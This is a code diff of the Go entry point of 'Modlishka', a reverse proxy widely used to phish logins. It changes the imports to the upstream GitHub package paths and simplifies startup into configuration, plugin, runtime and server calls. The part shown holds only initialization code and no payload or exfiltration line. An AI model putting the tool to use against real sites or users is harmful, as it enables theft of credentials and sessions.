@@ -1,23 +1,31 @@
+/**
+
+    "Modlishka" Reverse Proxy.
+
+    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+    You should have received a copy of the Modlishka License along with this program.
+
+**/
+
 package main
 
 import (
-	"flag"
-	"fmt"
-	"log"
-	"os"
-	"os/signal"
-	"syscall"
-
-	"modlishka-render/config"
-	"modlishka-render/core"
-	"modlishka-render/log"
-	"modlishka-render/plugin"
-	"modlishka-render/runtime"
+	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/core"
+	"github.com/drk1wi/Modlishka/log"
+	"github.com/drk1wi/Modlishka/plugin"
+	"github.com/drk1wi/Modlishka/runtime"
 )
 
 type Configuration struct{ config.Options }
 
 // Initializes the logging object
+
 func (c *Configuration) initLogging() {
 	//
 	// Logger
@@ -40,70 +48,36 @@ func (c *Configuration) initLogging() {
 		POST:           *c.LogPostOnly,
 		LogRequestPath: *c.LogRequestFile,
 	}
-
-	log.Init(*c.LogRequestFile)
-}
-
-func (c *Configuration) initPlugins() {
-	//
-	// Initialize plugins
-	//
-	plugin.Init(c.Options)
-}
-
-func (c *Configuration) initRuntime() {
-	//
-	// Initialize runtime
-	//
-	runtime.Init(c.Options)
-}
-
-func (c *Configuration) initCore() {
-	//
-	// Initialize core
-	//
-	core.Init(c.Options)
 }
 
 func main() {
-	//
-	// Parse command line arguments
-	//
-	configFile := flag.String("config", "config.json", "JSON configuration file")
-	flag.Parse()
 
-	//
-	// Load configuration
-	//
-	conf := &Configuration{}
-	conf.Options = config.LoadConfiguration(*configFile)
+	conf := Configuration{
+		config.ParseConfiguration(),
+	}
 
-	//
-	// Initialize components
-	//
+	// Initialize log
 	conf.initLogging()
-	conf.initPlugins()
-	conf.initRuntime()
-	conf.initCore()
 
-	//
-	// Start the proxy
-	//
-	fmt.Println("Starting Modlishka reverse proxy...")
-	fmt.Printf("Target: %s\n", *conf.Target)
-	fmt.Printf("Proxy Domain: %s\n", *conf.ProxyDomain)
-	fmt.Printf("Listening on: %s\n", *conf.ListeningAddress)
+	// Set up runtime plugin config
+	plugin.SetPluginRuntimeConfig(conf.Options)
 
-	// Handle graceful shutdown
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	// Initialize plugins
+	plugin.Enable(conf.Options)
 
-	go func() {
-		<-sigChan
-		fmt.Println("\nShutting down Modlishka...")
-		os.Exit(0)
-	}()
+	//Check if we have all of the required information to start proxy'ing requests.
+	conf.VerifyConfiguration()
 
-	// Start the server
-	core.Start()
+	// Set up runtime core config
+	runtime.SetCoreRuntimeConfig(conf.Options)
+
+	// Set up runtime server config
+	core.SetServerRuntimeConfig(conf.Options)
+
+	// Set up regexp upfront
+	runtime.MakeRegexes()
+
+	// go go go
+	core.RunServer()
+
 }
